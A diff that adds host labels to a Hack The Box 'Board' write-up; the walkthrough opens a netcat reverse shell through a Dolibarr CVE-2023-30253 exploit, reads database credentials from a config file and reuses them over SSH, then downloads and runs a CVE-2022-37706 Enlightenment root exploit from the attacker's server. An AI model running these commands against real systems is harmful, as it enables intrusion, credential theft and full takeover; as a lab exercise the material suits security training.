@@ -132,16 +132,19 @@ $ pip3 install -r requirements.txt
 
 Set up a listener, then fire the exploit targeting the CRM with our credentials and my Kali IP:
 
+**Kali:**
 ```console
 $ nc -lvnp 9001
 ```
 
+**Kali:**
 ```console
 $ python3 CVE-2023-30253.py --url http://crm.board.htb -u admin -p admin -r 10.10.15.229 9001
 ```
 
-The callback landed immediately. I upgraded the shell to get something usable:
+The callback landed immediately. I upgraded the shell inside the reverse shell to get something usable:
 
+**Target (www-data):**
 ```console
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 # Ctrl+Z to background
@@ -159,6 +162,7 @@ $ export TERM=xterm
 
 Running as `www-data` under the web root means I have read access to the application config files. Dolibarr stores its database credentials in `conf/conf.php`:
 
+**Target (www-data):**
 ```console
 $ cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
 
@@ -171,6 +175,7 @@ $dolibarr_main_db_pass='serverfun2$2023!!';
 
 There's a real password there: `serverfun2$2023!!`. Before digging into the database, I checked `/etc/passwd` for local users:
 
+**Target (www-data):**
 ```console
 $ cat /etc/passwd | grep bash
 
@@ -180,6 +185,7 @@ larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
 
 One user: `larissa`. People reuse passwords between app configs and their system account constantly on HTB, and this box is no different.
 
+**Kali:**
 ```console
 $ ssh larissa@board.htb
 ```
@@ -190,6 +196,7 @@ Password `serverfun2$2023!!` worked.
 
 ### user.txt
 
+**Target (larissa):**
 ```console
 $ cat user.txt
 c2bf4c9d************************
@@ -205,6 +212,7 @@ c2bf4c9d************************
 
 Standard first step from a user shell: look for SUID binaries. Something non-standard usually stands out:
 
+**Target (larissa):**
 ```console
 $ find / -perm -4000 -type f 2>/dev/null
 
@@ -217,6 +225,7 @@ $ find / -perm -4000 -type f 2>/dev/null
 
 Enlightenment utils with the SUID bit. That's unusual. I checked the version:
 
+**Target (larissa):**
 ```console
 $ enlightenment --version
 
@@ -229,6 +238,7 @@ Enlightenment 0.23.1 is vulnerable to CVE-2022-37706, a local privilege escalati
 
 I grabbed it on my Kali box and served it over HTTP:
 
+**Kali:**
 ```console
 $ git clone https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit
 $ cd CVE-2022-37706-LPE-exploit
@@ -237,6 +247,7 @@ $ python3 -m http.server
 
 On the target, I pulled the script down and ran it:
 
+**Target (larissa):**
 ```console
 $ wget http://10.10.15.229:8000/exploit.sh
 $ chmod +x exploit.sh
@@ -247,6 +258,7 @@ $ ./exploit.sh
 
 ### root.txt
 
+**Target (root):**
 ```console
 # cat root.txt
 a830c7e7************************
